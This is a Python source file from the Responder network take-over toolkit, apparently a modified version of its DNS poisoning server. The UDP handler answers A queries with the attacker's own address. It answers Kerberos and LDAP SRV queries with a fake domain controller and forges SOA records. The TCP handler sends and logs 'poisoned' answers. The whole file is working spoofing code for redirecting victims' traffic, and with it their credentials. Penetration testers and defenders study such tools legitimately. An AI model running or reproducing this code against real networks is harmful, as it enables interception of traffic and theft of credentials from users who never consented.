#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from packets import DNS_Ans
from SocketServer import BaseRequestHandler
from utils import *
from dnslib import *

def ParseDNSType(data):
	request = DNSRecord.parse(data)
	print(request)
	QueryTypeClass = data[len(data)-4:]

	# print text("[!] Query data: {0}".format(repr(data)))
	# print text("[!] QueryType: {0}".format(repr(QueryTypeClass)))

	# If Type A, Class IN, then answer.
	return QueryTypeClass == "\x00\x01\x00\x01"



class DNS(BaseRequestHandler):
	def handle(self):
		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None

		try:
			# data, soc = self.request

			# if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
			# 	buff = DNS_Ans()
			# 	buff.calculate(data)
			# 	soc.sendto(str(buff), self.client_address)

			# 	ResolveName = re.sub(r'[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
			# 	print color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)
			data, soc = self.request
			request = DNSRecord.parse(data)
			print(request)
			reply = DNSRecord(DNSHeader(id=request.header.id, 
			                            qr=1, 
			                            aa=1, 
			                            ra=1),
			                   q=request.q)
			if request.q.qtype == QTYPE.A:
			    reply.add_answer(RR(rname=request.q.qname,
			    					rtype=QTYPE.A,
			    					rdata=A(settings.Config.Bind_To)))
			elif request.q.qtype == QTYPE.SRV:
				if 'kerberos' in str(request.q.qname):
					port = 88
				elif 'ldap' in str(request.q.qname):
					port = 389
				else:
					port = 25
				reply.add_answer(RR(rname=request.q.qname,
									rtype=QTYPE.SRV,
									rdata=SRV(priority=0, 
											weight=100,
											port=port,
											target="dc01.corp.local")))
			elif request.q.qtype == QTYPE.SOA:
				reply.add_answer(RR(rname=request.q.qname,
									rtype=QTYPE.SOA,
									rdata=SOA(mname='dc01.corp.local',
											  rname='hostmaster.corp.local')
					))

			print('\n')
			print(reply)

			soc.sendto(reply.pack(), self.client_address)

		except Exception as e:
			print(e)
			pass

# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):
	def handle(self):
		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None
	
		try:
			data = self.request.recv(1024)

			if ParseDNSType(data) and settings.Config.AnalyzeMode is False:
				buff = DNS_Ans()
				buff.calculate(data)
				self.request.send(str(buff))

				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print color("[*] [DNS-TCP] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)

		except Exception:
			pass
